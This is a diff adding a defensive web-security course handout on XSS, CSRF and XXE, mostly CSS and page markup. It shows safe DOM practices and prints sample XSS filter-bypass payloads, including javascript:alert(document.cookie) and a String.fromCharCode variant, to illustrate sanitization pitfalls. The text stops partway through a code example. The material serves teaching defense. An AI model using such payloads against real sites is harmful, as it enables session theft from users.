@@ -3,76 +3,1529 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Topic 9: Secure Development III | CYB 236</title>
+    <title>CYB236 Handout - Chapters 22–24</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+        :root {
+            --primary-50: #eef2ff;
+            --primary-600: #4f46e5;
+            --primary-700: #4338ca;
+
+            --neutral-50: #fafafa;
+            --neutral-100: #f5f5f5;
+            --neutral-200: #e5e5e5;
+            --neutral-300: #d4d4d4;
+            --neutral-400: #a3a3a3;
+            --neutral-500: #737373;
+            --neutral-600: #525252;
+            --neutral-700: #404040;
+            --neutral-800: #262626;
+            --neutral-900: #171717;
+
+            --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
+            --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
+
+            /* ── Chapter Color ── */
+            --ch: #4f46e5;
+            --ch-light: #eef2ff;
+            --ch-mid: #a5b4fc;
+            --ch-dark: #312e81;
+
+            --dark: var(--neutral-900);
+            --dark2: var(--neutral-800);
+            --gray: var(--neutral-500);
+            --text: var(--neutral-700);
+            --light: var(--neutral-50);
+            --border: var(--neutral-200);
+            --green: #16a34a;
+            --green-light: #f0fdf4;
+            --red: #dc2626;
+            --red-light: #fef2f2;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
         body {
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            background: linear-gradient(135deg, #27ae60, #27ae60dd);
-            min-height: 100vh;
+            font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+            line-height: 1.7;
+            color: var(--text);
+            background: var(--light);
+            font-size: 16px;
+        }
+
+        /* ───── Top Navigation ───── */
+        .top-nav {
+            background: white;
+            border-bottom: 1px solid var(--neutral-200);
+            padding: 12px 0;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .top-nav-inner {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 40px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .nav-brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            text-decoration: none;
+            color: var(--neutral-800);
+        }
+
+        .nav-brand-icon {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, #4f46e5, #4338ca);
+            border-radius: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
-        }
-        .container {
-            background: white;
-            border-radius: 20px;
-            padding: 60px 40px;
-            text-align: center;
-            max-width: 600px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-        }
-        .topic-badge {
-            background: #27ae60;
             color: white;
-            padding: 8px 20px;
-            border-radius: 20px;
-            font-size: 0.9em;
-            font-weight: 600;
-            display: inline-block;
-            margin-bottom: 20px;
-            text-transform: uppercase;
+            font-weight: 700;
+            font-size: 14px;
         }
-        h1 {
-            color: #27ae60;
-            font-size: 2em;
-            margin-bottom: 15px;
-        }
-        .subtitle {
-            color: #666;
-            margin-bottom: 20px;
-        }
-        .coming-soon {
-            font-size: 3em;
-            margin: 30px 0;
-        }
-        p {
-            color: #666;
-            margin-bottom: 30px;
-            line-height: 1.6;
-        }
-        .back-link {
-            display: inline-block;
-            background: #27ae60;
-            color: white;
-            padding: 12px 30px;
+
+        .nav-brand-text { font-weight: 600; font-size: 15px; }
+        .nav-links { display: flex; gap: 8px; }
+
+        .nav-link {
+            padding: 8px 16px;
             border-radius: 8px;
             text-decoration: none;
-            font-weight: 600;
-            transition: opacity 0.3s;
+            color: var(--neutral-600);
+            font-weight: 500;
+            font-size: 14px;
+            transition: all 0.2s;
         }
-        .back-link:hover { opacity: 0.9; }
+
+        .nav-link:hover { background: var(--neutral-100); color: var(--neutral-800); }
+        .nav-link.active { background: var(--primary-50); color: var(--primary-700); }
+
+        /* ───── Cover ───── */
+        .cover {
+            background: linear-gradient(135deg, #0f0a2e 0%, #1e1b4b 50%, #312e81 100%);
+            color: white;
+            padding: 80px 40px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cover::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+        }
+
+        .cover-inner {
+            max-width: 1400px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+            text-align: center;
+        }
+
+        .cover-breadcrumb {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        .cover-breadcrumb a { color: #d4d4d4; text-decoration: none; }
+        .cover-breadcrumb span { color: #a3a3a3; }
+
+        .cover-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255,255,255,0.12);
+            backdrop-filter: blur(10px);
+            padding: 8px 16px;
+            border-radius: 100px;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--ch-mid);
+            margin-bottom: 20px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .cover-badge-dot { width: 8px; height: 8px; background: var(--ch); border-radius: 50%; }
+
+        .cover h1 {
+            font-size: 48px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            letter-spacing: -0.02em;
+            line-height: 1.1;
+        }
+
+        .cover .sub { font-size: 20px; color: #d4d4d4; margin-bottom: 30px; }
+
+        .cover-chips { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
+
+        .cover-chip {
+            padding: 10px 22px;
+            border-radius: 14px;
+            font-weight: 700;
+            font-size: 0.9em;
+            border: 1px solid rgba(255,255,255,0.2);
+            backdrop-filter: blur(4px);
+            background: rgba(79,70,229,0.4);
+        }
+
+        /* ───── Container ───── */
+        .container { max-width: 1400px; margin: 0 auto; padding: 40px; }
+
+        .main-layout {
+            display: grid;
+            grid-template-columns: 280px 1fr;
+            gap: 32px;
+            align-items: start;
+        }
+
+        /* ───── Sidebar ───── */
+        .sidebar { position: sticky; top: 86px; height: fit-content; }
+
+        .sidebar-card {
+            background: white;
+            border-radius: 16px;
+            border: 1px solid var(--neutral-200);
+            overflow: hidden;
+        }
+
+        .sidebar-header {
+            padding: 20px;
+            border-bottom: 1px solid var(--neutral-200);
+            background: var(--ch-light);
+        }
+
+        .sidebar-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--ch);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .sidebar-nav {
+            padding: 12px;
+            max-height: calc(100vh - 160px);
+            overflow: auto;
+        }
+
+        .sidebar-link {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 9px 12px;
+            border-radius: 10px;
+            text-decoration: none;
+            color: var(--neutral-600);
+            font-weight: 500;
+            font-size: 13px;
+            transition: all 0.2s;
+            margin-bottom: 3px;
+            line-height: 1.35;
+        }
+
+        .sidebar-link:hover { background: var(--ch-light); color: var(--ch-dark); }
+        .sidebar-link.active { background: var(--ch-light); color: var(--ch); }
+
+        .sidebar-link-number {
+            width: 26px; height: 26px;
+            background: var(--neutral-100);
+            border-radius: 7px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--neutral-500);
+            flex-shrink: 0;
+        }
+
+        .sidebar-link.active .sidebar-link-number { background: var(--ch); color: white; }
+
+        .sidebar-sep {
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--neutral-400);
+            padding: 12px 12px 6px;
+        }
+
+        /* ───── Content ───── */
+        .content { min-width: 0; }
+
+        /* ───── Chapter Header ───── */
+        .chapter-header { padding: 8px 0 30px; text-align: center; }
+
+        .chapter-num {
+            display: inline-block;
+            font-size: 0.85em;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            padding: 6px 20px;
+            border-radius: 999px;
+            margin-bottom: 14px;
+            background: var(--ch-light);
+            color: var(--ch);
+        }
+
+        .chapter-title { font-size: 2.2em; font-weight: 800; color: var(--dark); letter-spacing: -0.02em; }
+
+        .chapter-divider {
+            height: 4px;
+            border-radius: 2px;
+            margin: 10px auto 0;
+            width: 80px;
+            background: var(--ch);
+        }
+
+        /* ───── Topic Section ───── */
+        .topic {
+            margin-bottom: 32px;
+            background: white;
+            border-radius: 20px;
+            border: 1px solid var(--neutral-200);
+            padding: 34px;
+        }
+
+        .topic-header {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 24px;
+            padding-bottom: 18px;
+            border-bottom: 2px solid var(--neutral-100);
+        }
+
+        .topic-icon {
+            width: 48px; height: 48px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5em;
+            flex-shrink: 0;
+            background: var(--ch-light);
+        }
+
+        h2 { font-size: 1.55em; font-weight: 700; color: var(--dark); }
+        h3 { font-size: 1.2em; color: var(--dark2); margin: 24px 0 10px; }
+        p { margin-bottom: 14px; font-size: 1.02em; }
+        strong { color: var(--dark); }
+
+        /* ───── Learning Objectives ───── */
+        .objectives-grid { display: grid; gap: 16px; }
+
+        .objective-card {
+            display: flex;
+            gap: 16px;
+            padding: 20px;
+            background: var(--neutral-50);
+            border-radius: 12px;
+            border: 1px solid var(--neutral-200);
+        }
+
+        .objective-number {
+            width: 40px; height: 40px;
+            background: var(--ch);
+            color: white;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+
+        .objective-text { color: var(--neutral-700); font-size: 15px; line-height: 1.6; }
+
+        /* ───── Story Box ───── */
+        .story {
+            background: var(--ch-light);
+            border-radius: 18px;
+            padding: 28px 30px;
+            margin: 24px 0;
+            box-shadow: var(--shadow-sm);
+            border: 1px solid #c7d2fe;
+            border-left: 5px solid var(--ch);
+        }
+
+        .story-label {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 700;
+            font-size: 0.85em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 12px;
+            padding: 4px 14px;
+            border-radius: 8px;
+            background: #e0e7ff;
+            color: var(--ch);
+        }
+
+        .story p { margin-bottom: 10px; }
+        .story p:last-child { margin-bottom: 0; }
+
+        /* ───── Key Point ───── */
+        .key-point {
+            background: linear-gradient(135deg, #f0fdf4, #dcfce7);
+            border-left: 5px solid var(--green);
+            border-radius: 0 14px 14px 0;
+            padding: 20px 24px;
+            margin: 20px 0;
+        }
+
+        .key-point h4 { color: var(--green); margin-bottom: 6px; font-size: 1em; }
+        .key-point p { margin-bottom: 0; font-size: 1em; }
+
+        /* ───── Warning ───── */
+        .warning {
+            background: linear-gradient(135deg, var(--red-light), #fecaca);
+            border-left: 5px solid var(--red);
+            border-radius: 0 14px 14px 0;
+            padding: 20px 24px;
+            margin: 20px 0;
+        }
+
+        .warning h4 { color: var(--red); margin-bottom: 6px; font-size: 1em; }
+        .warning p { margin-bottom: 0; font-size: 1em; }
+
+        /* ───── Info Box ───── */
+        .info-box {
+            background: linear-gradient(135deg, #eff6ff, #dbeafe);
+            border-left: 5px solid #3b82f6;
+            border-radius: 0 14px 14px 0;
+            padding: 20px 24px;
+            margin: 20px 0;
+        }
+
+        .info-box h4 { color: #1d4ed8; margin-bottom: 6px; font-size: 1em; }
+        .info-box p { margin-bottom: 0; font-size: 1em; }
+
+        /* ───── Indigo Box ───── */
+        .indigo-box {
+            background: linear-gradient(135deg, #eef2ff, #e0e7ff);
+            border-left: 5px solid var(--ch);
+            border-radius: 0 14px 14px 0;
+            padding: 20px 24px;
+            margin: 20px 0;
+        }
+
+        .indigo-box h4 { color: var(--ch); margin-bottom: 6px; font-size: 1em; }
+        .indigo-box p { margin-bottom: 0; font-size: 1em; }
+
+        /* ───── Clean List ───── */
+        .clean-list { list-style: none; padding: 0; margin: 16px 0; }
+
+        .clean-list li {
+            padding: 10px 0 10px 36px;
+            position: relative;
+            border-bottom: 1px solid var(--border);
+            font-size: 1.02em;
+        }
+
+        .clean-list li:last-child { border-bottom: none; }
+
+        .clean-list li::before {
+            content: '';
+            position: absolute;
+            left: 0; top: 14px;
+            width: 20px; height: 20px;
+            border-radius: 6px;
+            background: var(--ch-light);
+            border: 1px solid #c7d2fe;
+        }
+
+        /* ───── Compare Grid ───── */
+        .compare-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin: 24px 0;
+        }
+
+        .compare-card {
+            background: var(--neutral-50);
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: var(--shadow-sm);
+            border-top: 4px solid;
+        }
+
+        .compare-card h4 { margin-bottom: 8px; font-size: 1.1em; }
+        .compare-card p { font-size: 0.95em; margin-bottom: 0; }
+
+        /* ───── Map / Icon Grid ───── */
+        .map-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 14px;
+            margin: 20px 0;
+        }
+
+        .map-card {
+            background: white;
+            border-radius: 14px;
+            padding: 20px;
+            text-align: center;
+            box-shadow: var(--shadow-sm);
+            border: 1px solid var(--border);
+            border-top: 3px solid var(--ch);
+            transition: transform 0.2s;
+        }
+
+        .map-card:hover { transform: translateY(-3px); }
+        .map-card .mc-icon { font-size: 2em; margin-bottom: 8px; }
+        .map-card .mc-title { font-weight: 700; color: var(--dark); font-size: 0.95em; margin-bottom: 4px; }
+        .map-card .mc-desc { color: var(--gray); font-size: 0.85em; }
+
+        /* ───── Step List ───── */
+        .step-list { list-style: none; padding: 0; margin: 20px 0; }
+
+        .step-list li {
+            display: flex;
+            gap: 16px;
+            padding: 14px 0;
+            border-bottom: 1px solid var(--border);
+            align-items: flex-start;
+        }
+
+        .step-list li:last-child { border-bottom: none; }
+
+        .step-num {
+            width: 32px; height: 32px;
+            background: var(--ch);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 0.95em;
+            color: white;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        /* ───── Code Box ───── */
+        .code-box {
+            background: #0f172a;
+            border-radius: 14px;
+            padding: 22px 24px;
+            margin: 20px 0;
+            font-family: 'JetBrains Mono', 'Consolas', monospace;
+            font-size: 0.88em;
+            line-height: 1.9;
+            color: #e2e8f0;
+            overflow-x: auto;
+            white-space: pre;
+        }
+
+        .code-box .k { color: #93c5fd; }
+        .code-box .s { color: #86efac; }
+        .code-box .n { color: #fbbf24; }
+        .code-box .c { color: #64748b; font-style: italic; }
+        .code-box .tag { color: #f472b6; }
+        .code-box .attr { color: #a5b4fc; }
+
+        /* ───── Data Table ───── */
+        .data-table { width: 100%; border-collapse: separate; border-spacing: 0 6px; margin: 20px 0; }
+
+        .data-table th {
+            text-align: left;
+            padding: 10px 16px;
+            font-size: 0.8em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--gray);
+        }
+
+        .data-table td { padding: 14px 16px; background: white; font-size: 0.98em; }
+        .data-table tr td:first-child { border-radius: 10px 0 0 10px; }
+        .data-table tr td:last-child  { border-radius: 0 10px 10px 0; }
+        .data-table tbody tr { box-shadow: 0 1px 4px rgba(0,0,0,0.05); }
+
+        /* ───── Section Divider ───── */
+        .section-divider {
+            height: 4px;
+            background: linear-gradient(90deg, var(--ch-light), var(--ch), var(--ch-light));
+            margin: 48px 0;
+            border-radius: 3px;
+        }
+
+        /* ───── Summary Banner ───── */
+        .summary-banner {
+            background: linear-gradient(135deg, var(--ch-dark), var(--ch));
+            border-radius: 18px;
+            padding: 30px;
+            margin: 30px 0;
+            color: white;
+        }
+
+        .summary-banner h3 { color: white; font-size: 1.3em; margin-bottom: 14px; }
+        .summary-banner ul { list-style: none; padding: 0; }
+
+        .summary-banner li {
+            padding: 8px 0 8px 28px;
+            position: relative;
+            opacity: 0.95;
+            font-size: 1.02em;
+        }
+
+        .summary-banner li::before { content: '\2713'; position: absolute; left: 0; font-weight: 700; }
+
+        /* ───── Footer ───── */
+        .footer { background: var(--neutral-900); color: white; padding: 48px 40px; margin-top: 20px; }
+
+        .footer-inner {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .footer-brand { font-weight: 700; font-size: 18px; }
+        .footer-links { display: flex; gap: 24px; }
+        .footer-links a { color: var(--neutral-400); text-decoration: none; font-size: 14px; }
+        .footer-links a:hover { color: white; }
+
+        @media (max-width: 900px) {
+            .main-layout { grid-template-columns: 1fr; }
+            .sidebar { position: static; }
+            .compare-grid { grid-template-columns: 1fr; }
+            .cover h1 { font-size: 32px; }
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <span class="topic-badge">Topic 9 - Development</span>
-        <h1>Secure Development III</h1>
-        <p class="subtitle">Defending Against XSS, CSRF, XXE</p>
-        <div class="coming-soon">Coming Soon</div>
-        <p>This module is currently under development. Check back later for lectures, labs, and resources.</p>
-        <a href="../" class="back-link">&larr; Back to Course Home</a>
+
+<!-- Top Navigation -->
+<nav class="top-nav">
+    <div class="top-nav-inner">
+        <a href="../index.html" class="nav-brand">
+            <div class="nav-brand-icon">CYB</div>
+            <span class="nav-brand-text">CYB 236: Web Application Security</span>
+        </a>
+        <div class="nav-links">
+            <a href="../index.html" class="nav-link">Course Home</a>
+            <a href="../week8/index.html" class="nav-link">Week 8</a>
+            <a href="index.html" class="nav-link active">Week 9</a>
+        </div>
     </div>
+</nav>
+
+<!-- ══════════════════════ COVER ══════════════════════ -->
+<header class="cover">
+    <div class="cover-inner">
+        <div class="cover-breadcrumb">
+            <a href="../index.html">CYB 236</a>
+            <span>›</span>
+            <span>Week 9</span>
+            <span>›</span>
+            <span>Part III — Secure Development III</span>
+        </div>
+        <div class="cover-badge">
+            <div class="cover-badge-dot"></div>
+            Week 9 &nbsp;·&nbsp; Secure Development III
+        </div>
+        <h1>Defending Against XSS, CSRF &amp; XXE</h1>
+        <p class="sub">Sanitize · Tokenize · Configure · Eliminate Attack Surfaces</p>
+        <div class="cover-chips">
+            <div class="cover-chip">Ch.22 Defending Against XSS</div>
+            <div class="cover-chip">Ch.23 Defending Against CSRF</div>
+            <div class="cover-chip">Ch.24 Defending Against XXE</div>
+        </div>
+    </div>
+</header>
+
+<!-- ══════════════════════ BODY ══════════════════════ -->
+<div class="container">
+<div class="main-layout">
+
+<!-- ═══════════ SIDEBAR ═══════════ -->
+<aside class="sidebar">
+    <div class="sidebar-card">
+        <div class="sidebar-header">
+            <div class="sidebar-title">Chapters 22–24 — Contents</div>
+        </div>
+        <nav class="sidebar-nav">
+            <a href="#overview"       class="sidebar-link active"><span class="sidebar-link-number">1</span>Overview</a>
+            <a href="#objectives"     class="sidebar-link"><span class="sidebar-link-number">2</span>Learning Objectives</a>
+            <div class="sidebar-sep">Ch.22 — XSS Defense</div>
+            <a href="#xss-best"       class="sidebar-link"><span class="sidebar-link-number">3</span>Anti-XSS Best Practices</a>
+            <a href="#xss-sanitize"   class="sidebar-link"><span class="sidebar-link-number">4</span>Sanitizing User Input</a>
+            <a href="#xss-sinks"      class="sidebar-link"><span class="sidebar-link-number">5</span>Dangerous DOM APIs</a>
+            <a href="#xss-entity"     class="sidebar-link"><span class="sidebar-link-number">6</span>HTML Entity Encoding</a>
+            <a href="#xss-css"        class="sidebar-link"><span class="sidebar-link-number">7</span>CSS as Attack Vector</a>
+            <a href="#xss-csp"        class="sidebar-link"><span class="sidebar-link-number">8</span>Content Security Policy</a>
+            <div class="sidebar-sep">Ch.23 — CSRF Defense</div>
+            <a href="#csrf-headers"   class="sidebar-link"><span class="sidebar-link-number">9</span>Header Verification</a>
+            <a href="#csrf-tokens"    class="sidebar-link"><span class="sidebar-link-number">10</span>CSRF Tokens</a>
+            <a href="#csrf-get"       class="sidebar-link"><span class="sidebar-link-number">11</span>Stateless GET Requests</a>
+            <a href="#csrf-middleware" class="sidebar-link"><span class="sidebar-link-number">12</span>Anti-CSRF Middleware</a>
+            <div class="sidebar-sep">Ch.24 — XXE Defense</div>
+            <a href="#xxe-disable"    class="sidebar-link"><span class="sidebar-link-number">13</span>Disabling External Entities</a>
+            <a href="#xxe-json"       class="sidebar-link"><span class="sidebar-link-number">14</span>XML vs JSON</a>
+            <a href="#xxe-advanced"   class="sidebar-link"><span class="sidebar-link-number">15</span>Advanced XXE Risks</a>
+            <div class="sidebar-sep">Wrap-Up</div>
+            <a href="#summary"        class="sidebar-link"><span class="sidebar-link-number">16</span>Combined Summary</a>
+        </nav>
+    </div>
+</aside>
+
+<!-- ═══════════ MAIN CONTENT ═══════════ -->
+<main class="content">
+
+<!-- ════════ CHAPTER HEADER ════════ -->
+<div class="chapter-header">
+    <div class="chapter-num">Chapters 22 – 24</div>
+    <div class="chapter-title">Defending Against XSS, CSRF &amp; XXE</div>
+    <div class="chapter-divider"></div>
+</div>
+
+<!-- ════════ OVERVIEW ════════ -->
+<div id="overview" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128737;</div>
+        <h2>Overview — From Attack to Defense</h2>
+    </div>
+
+    <p>In Part II of the book, we learned how to <em>exploit</em> web applications using XSS, CSRF, and XXE attacks. Now, in Part III, we shift perspective: the goal is to <strong>defend</strong> our codebase against these same attack classes. Each chapter provides concrete coding techniques, configuration changes, and architectural decisions that eliminate or dramatically reduce the attack surface.</p>
+
+    <div class="map-grid">
+        <div class="map-card">
+            <div class="mc-icon">&#128187;</div>
+            <div class="mc-title">Ch.22 — XSS Defense</div>
+            <div class="mc-desc">Sanitize DOM insertion, avoid dangerous APIs, encode entities, and deploy Content Security Policy (CSP).</div>
+        </div>
+        <div class="map-card">
+            <div class="mc-icon">&#128274;</div>
+            <div class="mc-title">Ch.23 — CSRF Defense</div>
+            <div class="mc-desc">Verify headers, implement CSRF tokens, enforce stateless GET requests, and build anti-CSRF middleware.</div>
+        </div>
+        <div class="map-card">
+            <div class="mc-icon">&#128196;</div>
+            <div class="mc-title">Ch.24 — XXE Defense</div>
+            <div class="mc-desc">Disable external entities, evaluate alternative data formats (JSON), and understand advanced XXE escalation risks.</div>
+        </div>
+    </div>
+
+    <div class="indigo-box">
+        <h4>&#128203; Defense Is Always Multi-Layered</h4>
+        <p>No single technique fully protects against any of these attack classes. Effective defense combines multiple strategies — coding best practices, input sanitization, token-based verification, and browser-level policies — so that if one layer is bypassed, others remain in place.</p>
+    </div>
+</div>
+
+<!-- ════════ LEARNING OBJECTIVES ════════ -->
+<div id="objectives" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#127919;</div>
+        <h2>Learning Objectives</h2>
+    </div>
+    <div class="objectives-grid">
+        <div class="objective-card">
+            <div class="objective-number">1</div>
+            <div class="objective-text"><strong>Apply</strong> anti-XSS coding best practices — including the difference between <code>innerText</code> and <code>innerHTML</code>, string-like validation, and identifying dangerous DOM API sinks (DOMParser, SVG, Blob).</div>
+        </div>
+        <div class="objective-card">
+            <div class="objective-number">2</div>
+            <div class="objective-text"><strong>Configure</strong> a Content Security Policy (CSP) to restrict script sources and disable <code>unsafe-eval</code> and <code>unsafe-inline</code>, explaining how CSP mitigates XSS at the browser level.</div>
+        </div>
+        <div class="objective-card">
+            <div class="objective-number">3</div>
+            <div class="objective-text"><strong>Implement</strong> CSRF defenses — including origin/referer header verification, stateful and stateless CSRF tokens, and application-wide anti-CSRF middleware.</div>
+        </div>
+        <div class="objective-card">
+            <div class="objective-number">4</div>
+            <div class="objective-text"><strong>Explain</strong> why HTTP GET requests must never modify server-side state and how this single design rule eliminates the most common class of CSRF attacks.</div>
+        </div>
+        <div class="objective-card">
+            <div class="objective-number">5</div>
+            <div class="objective-text"><strong>Defend</strong> against XXE by disabling external entities in XML parsers, evaluating JSON as a safer alternative, and recognizing how XXE can escalate from read-only access to remote code execution.</div>
+        </div>
+    </div>
+</div>
+
+<div class="section-divider"></div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!--                  CHAPTER 22 — XSS DEFENSE                -->
+<!-- ══════════════════════════════════════════════════════════ -->
+
+<!-- ════════ ANTI-XSS BEST PRACTICES ════════ -->
+<div id="xss-best" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128187;</div>
+        <h2>Ch.22 — Anti-XSS Coding Best Practices</h2>
+    </div>
+
+    <p>The single most important rule for preventing XSS is: <strong>"Never allow any unsanitized user-supplied data to be passed into the DOM."</strong> Ideally, user data should only enter the DOM as plain text strings — never as HTML that the browser interprets as executable markup.</p>
+
+    <h3>The Core Rule</h3>
+
+    <div class="compare-grid">
+        <div class="compare-card" style="border-top-color: var(--red);">
+            <h4>&#10060; Avoid: innerHTML</h4>
+            <p><code>innerHTML</code> interprets HTML tags as actual DOM elements. If user input contains <code>&lt;script&gt;</code> or event-handler attributes, they execute as code.</p>
+        </div>
+        <div class="compare-card" style="border-top-color: var(--green);">
+            <h4>&#9989; Prefer: innerText</h4>
+            <p><code>innerText</code> treats everything as a plain string. HTML tags are displayed as literal text, not rendered as DOM. This is significantly safer.</p>
+        </div>
+    </div>
+
+    <div class="code-box">
+<span class="c">// ✗ UNSAFE — tags are interpreted as DOM</span>
+<span class="k">const</span> userString = <span class="s">'&lt;strong&gt;hello, world!&lt;/strong&gt;'</span>;
+<span class="k">const</span> div = document.querySelector(<span class="s">'#userComment'</span>);
+div.<span class="n">innerHTML</span> = userString;  <span class="c">// &lt;strong&gt; renders as bold text</span>
+
+<span class="c">// ✓ SAFE — tags are displayed as literal text</span>
+div.<span class="n">innerText</span> = userString;  <span class="c">// shows "&lt;strong&gt;hello, world!&lt;/strong&gt;" as text</span>
+    </div>
+
+    <h3>Validating String-Like Objects</h3>
+    <p>Before inserting any user data into the DOM, verify that it is a primitive string or number (a "string-like" value). Complex objects such as functions must be rejected.</p>
+
+    <div class="code-box">
+<span class="c">// Check if a value is a simple string</span>
+<span class="k">const</span> <span class="n">isString</span> = <span class="k">function</span>(x) {
+    <span class="k">if</span> (<span class="k">typeof</span> x === <span class="s">'string'</span> || x <span class="k">instanceof</span> String) {
+        <span class="k">return</span> <span class="n">true</span>;
+    }
+    <span class="k">return</span> <span class="n">false</span>;
+};
+
+<span class="c">// Check if a value is "string-like" (string or number — safe for DOM)</span>
+<span class="k">const</span> <span class="n">isStringLike</span> = <span class="k">function</span>(x) {
+    <span class="k">try</span> {
+        <span class="k">return</span> JSON.stringify(JSON.parse(x)) === x;
+    } <span class="k">catch</span> (e) {
+        console.log(<span class="s">'not string-like'</span>);
+    }
+};
+    </div>
+
+    <div class="key-point">
+        <h4>&#128273; Default to Rejection</h4>
+        <p>Allowing user-supplied data to populate the DOM should be a <em>fallback, last-case option</em> — not the first option. Whenever an alternative exists that does not require DOM injection, choose it instead.</p>
+    </div>
+</div>
+
+<!-- ════════ SANITIZING INPUT ════════ -->
+<div id="xss-sanitize" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128703;</div>
+        <h2>Sanitizing User Input</h2>
+    </div>
+
+    <p>Sometimes you cannot avoid injecting user data as HTML — for example, when a feature requires allowing certain tags (like <code>&lt;b&gt;</code> or <code>&lt;i&gt;</code>) but not others (like <code>&lt;script&gt;</code>). In these cases, <strong>extensive sanitization</strong> is required before any data reaches the DOM.</p>
+
+    <div class="story">
+        <div class="story-label">&#128214; From the Book — Bypassing Simple Filters</div>
+        <p>Assume your sanitizer blocks single and double quotes as well as <code>&lt;script&gt;</code> tags. An attacker can still execute code using the JavaScript pseudo-scheme:</p>
+    </div>
+
+    <div class="code-box">
+<span class="c">&lt;!-- No script tags, no quotes — but still executes JavaScript --&gt;</span>
+<span class="tag">&lt;a</span> <span class="attr">href</span>=<span class="s">"javascript:alert(document.cookie)"</span><span class="tag">&gt;</span>click me<span class="tag">&lt;/a&gt;</span>
+
+<span class="c">&lt;!-- Even bypasses quote filtering using String.fromCharCode() --&gt;</span>
+<span class="tag">&lt;a</span> <span class="attr">href</span>=<span class="s">"javascript:alert(String.fromCharCode(88,83,83))"</span><span class="tag">&gt;</span>click me<span class="tag">&lt;/a&gt;</span>
+<span class="c">&lt;!-- Alerts "XSS" without any quotes in the payload --&gt;</span>
+    </div>
+
+    <div class="warning">
+        <h4>&#9888;&#65039; Sanitization Is Extremely Hard</h4>
+        <p>The DOM specification is vast and complex. Any API that converts text to DOM or text to script is a potential XSS vector. Complete sanitization is nearly impossible to achieve with a home-brewed solution — always prefer well-tested, maintained libraries and browser-native protections.</p>
+    </div>
+
+    <h3>Sanitizing Hyperlinks</h3>
+    <p>When user input is used in navigation URLs, leverage the browser's built-in <code>&lt;a&gt;</code> tag sanitization rather than building your own filter:</p>
+
+    <div class="code-box">
+<span class="c">// ✓ Use a dummy &lt;a&gt; tag to take advantage of browser sanitization</span>
+<span class="k">const</span> userLink = <span class="s">"&lt;script&gt;alert('hi')&lt;/script&gt;"</span>;
+
+<span class="k">const</span> <span class="n">goToLink</span> = <span class="k">function</span>() {
+    <span class="k">const</span> dummy = document.createElement(<span class="s">'a'</span>);
